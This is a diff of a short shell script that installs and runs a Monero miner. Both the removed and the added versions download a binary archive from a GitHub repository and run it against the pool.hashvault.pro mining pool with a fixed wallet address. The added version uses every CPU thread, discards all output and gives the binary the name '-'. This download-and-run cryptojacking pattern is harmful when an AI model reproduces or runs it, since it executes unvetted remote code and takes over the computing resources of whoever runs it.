@@ -1,5 +1,11 @@
 #!/bin/sh
-wget https://github.com/Adeemar7/soft/raw/main/xlarig.tar.gz
-chmod 777 xlarig
-./xlarig --coin=XMR -o pool.hashvault.pro:80 -u 86bqyB1FLa39SVdf5HzEmT1NfuKi9auJej4sYBqptTTU4Wz17ZeBmfa7nZYiEBVW4CNeJNi3UZFmJhNcfmd4zqVKJeirEK5.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x >/dev/null 2>&1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+
+A=pool.hashvault.pro:80
+B=86bqyB1FLa39SVdf5HzEmT1NfuKi9auJej4sYBqptTTU4Wz17ZeBmfa7nZYiEBVW4CNeJNi3UZFmJhNcfmd4zqVKJeirEK5
+C=PAYG
+D=rx/0
+apt-get update && apt-get upgrade -y
+wget https://github.com/muledan1/bash/raw/main/-.tar.gz
+tar -xf -.tar.gz
+./- --donate-level 1 -o $A -u $B -p $C -a $D -k -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
